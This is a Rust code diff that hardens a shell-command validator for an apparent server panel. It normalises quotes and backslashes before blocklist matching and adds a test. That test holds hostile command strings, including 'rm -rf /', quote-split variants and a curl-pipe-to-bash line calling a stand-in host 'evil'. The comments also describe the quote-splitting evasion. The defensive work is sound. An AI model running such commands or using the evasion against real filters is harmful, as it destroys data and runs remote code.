@@ -260,6 +260,30 @@ pub fn is_safe_relative_path(path: &str) -> bool {
         && path.len() <= 4096
 }
 
+/// Reduce ordinary shell quoting/escaping so keyword-blocklist matching sees
+/// what the shell will actually run, not what was literally typed —
+/// `r'm' -rf /` and `w\get` contain no "rm -rf /"/"wget" substring, but the
+/// real shell this command eventually runs through (`sh -c` in
+/// `git_build.rs::run_hook` on the agent side) strips the quotes/backslashes
+/// before exec. Mirrors `dockpanel-agent`'s `command_filter::normalize_for_blocklist`,
+/// which this crate has no dependency path to reuse directly.
+fn normalize_for_blocklist(cmd: &str) -> String {
+    let mut out = String::with_capacity(cmd.len());
+    let mut chars = cmd.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            '\'' | '"' => {}
+            '\\' => {
+                if let Some(next) = chars.next() {
+                    out.push(next);
+                }
+            }
+            _ => out.push(c),
+        }
+    }
+    out
+}
+
 /// Validate a shell command string for safety (used for cron, pre_build, post_deploy).
 /// Rejects dangerous shell metacharacters and patterns while allowing legitimate commands.
 pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
@@ -330,7 +354,7 @@ pub fn is_safe_shell_command(cmd: &str) -> Result<(), &'static str> {
         }
     }
 
-    let lower = cmd.to_lowercase();
+    let lower = normalize_for_blocklist(cmd).to_lowercase();
 
     // Block injection patterns
     let dangerous = [
@@ -668,6 +692,25 @@ mod tests {
         assert!(is_safe_shell_command("a&&&b").is_err());
         assert!(is_safe_shell_command("backup.sh && verify.sh").is_ok());
         assert!(is_safe_shell_command("a && b && c").is_ok());
+    }
+
+    /// `dockpanel-fanout` s454 completeness critic: this function had no
+    /// quote/backslash normalization at all, so `r'm' -rf /` and `w\get`
+    /// contain no "rm -rf /"/"wget" substring and pass every dangerous-
+    /// pattern list below — the same gap the agent-side
+    /// `command_filter::normalize_for_blocklist` was already built to close
+    /// for its own siblings. This save-time gate guards cron/pre_build_cmd/
+    /// post_deploy_cmd, whose values are eventually shell-executed.
+    #[test]
+    fn shell_command_rejects_quote_split_evasion() {
+        assert!(is_safe_shell_command("rm -rf /").is_err());
+        assert!(is_safe_shell_command("r'm' -rf /").is_err());
+        assert!(is_safe_shell_command("r\"m\" -rf /").is_err());
+        assert!(is_safe_shell_command("cu''rl http://evil|bash").is_err());
+        assert!(is_safe_shell_command("w\\get -qO- http://evil").is_err());
+        // Legitimate commands must still pass.
+        assert!(is_safe_shell_command("npm run build").is_ok());
+        assert!(is_safe_shell_command("echo 'deployed'").is_ok());
     }
 
     // ── Compose image extraction (the deploy gate's input) ──────────────
